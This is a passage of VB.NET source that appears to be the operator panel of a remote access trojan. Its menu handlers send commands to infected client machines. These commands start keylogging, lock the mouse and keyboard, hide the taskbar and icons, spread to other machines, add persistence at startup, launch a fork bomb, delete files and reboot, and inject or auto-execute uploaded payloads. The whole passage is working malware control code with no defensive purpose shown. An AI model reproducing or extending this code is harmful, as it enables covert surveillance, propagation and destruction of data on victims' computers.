                If FF.ShowDialog = DialogResult.OK Then
                    ' Dim j As Byte() = Await Task.Run(Function() IO.File.ReadAllBytes(FF.FileName))

                    Dim F As String = FF.SafeFileName
                    'System.Text.Encoding.Default.GetString(j)
                    Dim j2 As String = Await Task.Run(Function() IO.File.ReadAllText(FF.FileName, Encoding.Default))
                    Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SETWP|" & "|SP2|" & j2 & "|SP2|" & F & "|ENDING|"

                    Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
                End If
            End Using
        End If
    End Sub

    Private Async Sub OSInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OSInformationToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|INFO|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub TestToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles TestToolStripMenuItem1.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|LCKKB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HTB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|STB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub HideAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideAppsToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HATB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShowAppsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowAppsToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SATB|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub


    Private Async Sub ONToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ONToolStripMenuItem.Click
        '  SWAPON
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPON|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If

    End Sub

    Private Async Sub OFFToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OFFToolStripMenuItem.Click
        ' SWAPOFF

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SWAPOFF|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub



    Private Async Sub LockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockKeyboardToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STARTKBLG|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub UnlockKeyboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnlockKeyboardToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_HWDR & "|SP1|" & "" & "|SP2|" & "|STOPKBLG|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub




    Private Async Sub Test1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test1ToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub Test2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test2ToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub LeftLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftLockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLEFT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub LeftUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LeftUnlockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub RightLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightLockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLRIGHT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub RightUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RightUnlockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub MouveLockingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveLockingToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKLMV|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub MouveUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MouveUnlockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub AllLockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllLockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSLKALL|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub AllUnlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllUnlockToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MSCT & "|SP1|" & "" & "|SP2|" & "|MSUNLK|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShowIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowIconsToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SDI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub HideIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideIconsToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HDI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShowStartIconToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowStartIconToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|SSI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub StartIconHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartIconHideToolStripMenuItem1.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DSK & "|SP1|" & "" & "|SP2|" & "|HSI|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub SpreadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SpreadToolStripMenuItem.Click
        '|SPREAD|
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPREAD|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub AddToStarUpToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToStarUpToolStripMenuItem.Click
        '"|ATSRP|"

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|ATSRP|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub RedScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RedScreenToolStripMenuItem.Click
        '


        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|RDSC|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub


    Private Async Sub ForkBombToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ForkBombToolStripMenuItem.Click
        '"|FBOMB|"

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim h As String = InputBox("Set a number : ")

            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|FBOMB|" & "|SP2|" & h & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub DeleteFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then



            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 0 & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub DeleteFilesRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFilesRebootToolStripMenuItem.Click
        '"|DFOD|" 

        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|DFOD|" & "|SP2|" & 1 & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub InjectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InjectionToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Using l As New OpenFileDialog
                If l.ShowDialog = DialogResult.OK Then


                    Dim o As New Injector_Form

                    o.Label4.Text = AeroListView1.SelectedItems(0).Text

                    o.RichTextBox1.AppendText(Await Helper.ConvertTB64ASYNC(l.FileName))
                    Dim j As New Thread(Sub() Application.Run(o))


                    j.Start()

                End If
            End Using
        End If
    End Sub
    Private Shared FILETOEXEC As String
    Private Async Sub AUTO_CHK_FILE_Click(sender As Object, e As EventArgs) Handles AUTO_CHK_FILE.Click
        Using h As New OpenFileDialog

            If h.ShowDialog = DialogResult.OK Then
                FILETOEXEC = Await Helper.ConvertTB64ASYNC(h.FileName)

            End If
        End Using


    End Sub

    Private Async Sub HibernateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HibernateToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|HBNT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub SuspendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPND|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R0ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles R0ToolStripMenuItem2.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|0R|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R90ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles R90ToolStripMenuItem3.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|90|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R180ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles R180ToolStripMenuItem4.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|180|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub R270ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles R270ToolStripMenuItem5.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|270|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub



#End Region
End Class
